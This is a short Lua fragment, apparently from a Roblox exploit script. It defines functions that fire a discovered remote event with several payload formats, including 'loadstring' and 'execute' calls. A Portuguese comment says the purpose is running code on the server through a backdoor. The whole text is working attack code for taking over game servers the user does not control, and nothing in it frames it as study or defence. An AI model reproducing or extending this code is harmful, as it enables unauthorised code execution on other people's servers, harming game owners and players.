    local function sendCommand(cmd, ...)
        if not workingRemote then return false end
        local args = {...}
        local formats = {
            function() workingRemote:FireServer(cmd, unpack(args)) end,
            function() workingRemote:FireServer({cmd, unpack(args)}) end,
            function() workingRemote:FireServer({Command = cmd, Args = args}) end,
        }
        for _, fn in ipairs(formats) do
            local ok = pcall(fn)
            if ok then return true end
        end
        return false
    end

    -- Executa código no servidor via backdoor
    local function executeServer(code)
        if not workingRemote then return false end
        local formats = {
            function() workingRemote:FireServer("loadstring", code) end,
            function() workingRemote:FireServer({loadstring = code}) end,
            function() workingRemote:FireServer("execute", code) end,
            function() workingRemote:FireServer({cmd = "loadstring", code = code}) end,
        }
        for _, fn in ipairs(formats) do
            local ok = pcall(fn)
            if ok then return true end
        end
        return false
    end

